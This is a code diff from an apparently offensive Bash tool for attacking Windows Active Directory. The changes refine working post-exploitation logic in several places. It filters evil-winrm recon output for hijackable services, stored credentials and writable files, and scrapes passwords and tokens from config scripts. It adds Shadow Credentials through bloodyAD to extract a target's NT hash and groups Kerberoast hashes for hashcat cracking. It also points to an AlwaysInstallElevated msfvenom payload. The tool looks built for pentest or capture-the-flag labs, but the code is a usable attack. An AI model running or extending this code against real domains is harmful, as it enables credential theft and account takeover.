@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.35.1"
+readonly VERSION="1.35.2"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2494,7 +2494,7 @@ _winrm_postex() {
     # the REAL command output (otherwise our own PowerShell text gets mis-flagged).
     local clean="$OUTDIR/.winrm_postex_clean.$$"
     sed -E 's/\x1b\[[0-9;?]*[a-zA-Z]//g' "$out" \
-        | grep -avE 'Evil-WinRM|quoting_detection|evil-winrm#|Establishing connection|PS C:\\|whoami /all; echo' >"$clean"
+        | grep -avE 'Evil-WinRM|quoting_detection|evil-winrm#|Establishing connection|PS C:\\|whoami /all; echo|Info: Exiting|Exiting with code|^Info: ' >"$clean"
     # Show each non-empty section inline so the next step is visible, not buried.
     local sec body
     for sec in HIJACK CMDKEY FLAGS AIE SVC TASKS PROFFILES PROFSCRIPTS NONSTD CONFIGS WRITABLE CDRIVE; do
@@ -2502,7 +2502,7 @@ _winrm_postex() {
         [[ -z "$body" ]] && continue
         local cap=15
         case "$sec" in
-            HIJACK)     loot "${C_RED}${C_BOLD}★★ HIJACKABLE task/service — its binary or dir is writable by us → overwrite/plant to run AS the listed account:${C_RESET}"; cap=40 ;;
+            HIJACK)     grep -qE 'TASK \[|SVC \[' <<<"$body" || continue; loot "${C_RED}${C_BOLD}★★ HIJACKABLE task/service — its binary or dir is writable by us → overwrite/plant to run AS the listed account:${C_RESET}"; cap=40 ;;
             CMDKEY)     [[ "$body" == *NONE* ]] && continue; loot "★ Stored credentials (cmdkey /list):" ;;
             FLAGS)      loot "★ Flag file(s) readable from this shell:" ;;
             AIE)        grep -qiE '0x1' <<<"$body" && loot "★ AlwaysInstallElevated=1 → MSI as SYSTEM (msfvenom -f msi -p windows/x64/exec)" || continue ;;
@@ -2515,11 +2515,17 @@ _winrm_postex() {
             WRITABLE)   loot "★★ Files in C:\\Share / IIS that WE can WRITE → plant/hijack for the account that runs them:" ;;
             CDRIVE)     info "C:\\ top-level:" ;;
         esac
-        printf '%s\n' "$body" | head -"$cap" | while IFS= read -r l; do detail "      ${l}"; done
+        # detail() runs `echo -e`, which mangles Windows backslash paths (\T→TAB,
+        # \A→…). Double the backslashes so they print literally.
+        printf '%s\n' "$body" | head -"$cap" | while IFS= read -r l; do detail "      ${l//\\/\\\\}"; done
     done
-    # Harvest credentials from script/config content we read (process subst, not a
-    # pipe → queued creds survive). Scoped to the content sections.
-    awk '/===(CONFIGS|PROFSCRIPTS)===/{f=1;next} /^===[A-Z]+===/{f=0} f' "$clean" >"$clean.cfg" 2>/dev/null
+    # Harvest credentials from script/config content — but ONLY from lines that look
+    # like an actual cred assignment (keyword + : or =). Feeding raw script text to
+    # the generic harvester flagged identifiers/filenames (OfficeIntegrator.ps1) as
+    # "passwords". process-sub (not a pipe) so queued creds survive.
+    awk '/===(CONFIGS|PROFSCRIPTS)===/{f=1;next} /^===[A-Z]+===/{f=0} f' "$clean" 2>/dev/null \
+        | grep -viE '^###|^\s*#' \
+        | grep -iE '(password|passwd|pwd|secret|credential|api[-_ ]?key|connectionstring|conn(ection)?str|token|user(name)?|-p |/p:)\s*[:=]' >"$clean.cfg" 2>/dev/null
     [[ -s "$clean.cfg" ]] && harvest_secrets "winrm-configs" < "$clean.cfg"
     rm -f "$clean" "$clean.cfg" 2>/dev/null
     loot "WinRM post-ex recon saved → $(basename "$out")"
@@ -2998,8 +3004,16 @@ _abuse_shadowcred() {
         local -a ba2; mapfile -t ba2 < <(bloody_args)
         run "bloodyAD ${ba2[*]} add shadowCredentials '$target'"
         local bo; bo=$( cd "$OUTDIR" && bloodyAD "${ba2[@]}" add shadowCredentials "$target" 2>&1 ); echo "$bo" | tee -a "$LOGFILE"
-        # NT hash from the PKINIT unpac, ignoring the empty-LM constant.
-        nt=$(grep -oiE '[0-9a-f]{32}' <<<"$bo" | grep -viE '^aad3b435b51404eeaad3b435b51404ee$' | tail -1)
+        # Only parse a hash if it ACTUALLY succeeded. bloodyAD prints a 64-char
+        # "sha256 of RSA key" line during key generation even when the LDAP write is
+        # then refused (insufficient rights) — a greedy [0-9a-f]{32} would slice that
+        # sha256 in half and report garbage as the NT hash (queuing a dead cred).
+        # Bail on any failure, and match the hash with WORD BOUNDARIES (so a 64-char
+        # sha256 can never yield a 32-char "match") while skipping the sha256 line.
+        nt=""
+        if ! grep -qiE 'insufficient|INSUFF_ACCESS|Traceback|Exception|denied|could not|not allowed|\[-\]' <<<"$bo"; then
+            nt=$(grep -viE 'sha256' <<<"$bo" | grep -oiE '\b[0-9a-f]{32}\b' | grep -viE '^aad3b435b51404eeaad3b435b51404ee$' | tail -1)
+        fi
         if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
             rb_record "Shadow Credentials (KeyCredentialLink) added on $target" \
                       "bloodyAD ${ba2[*]} remove shadowCredentials '$target'"
@@ -5553,9 +5567,14 @@ final_summary() {
         fi
 
         if [[ -s "$OUTDIR/kerberoast_hashes.txt" ]] && grep -qi krb5tgs "$OUTDIR/kerberoast_hashes.txt"; then
-            detail "  ${C_BOLD}${C_YELLOW}» Kerberoastable${C_RESET} ${C_DIM}($(grep -c krb5tgs "$OUTDIR/kerberoast_hashes.txt") — hashcat -m 13100)${C_RESET}"
-            while IFS= read -r h; do local w; w=$(echo "$h" | grep -oiP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+')
-                detail "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done < <(grep -i krb5tgs "$OUTDIR/kerberoast_hashes.txt")
+            # One entry per SPN account: the same account roasted across rounds yields
+            # different (nonce-varied) hashes — show it once, not duplicated.
+            local _kr; _kr=$(grep -i krb5tgs "$OUTDIR/kerberoast_hashes.txt" | while IFS= read -r h; do
+                printf '%s|%s\n' "$(grep -oiP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+' <<<"$h")" "$h"; done \
+                | sort -t'|' -k1,1 -u | cut -d'|' -f2-)
+            detail "  ${C_BOLD}${C_YELLOW}» Kerberoastable${C_RESET} ${C_DIM}($(printf '%s\n' "$_kr" | grep -c .) — hashcat -m 13100)${C_RESET}"
+            while IFS= read -r h; do [[ -z "$h" ]] && continue; local w; w=$(echo "$h" | grep -oiP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+')
+                detail "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done < <(printf '%s\n' "$_kr")
         fi
 
         if [[ -s "$OUTDIR/timeroast_hashes.txt" ]]; then
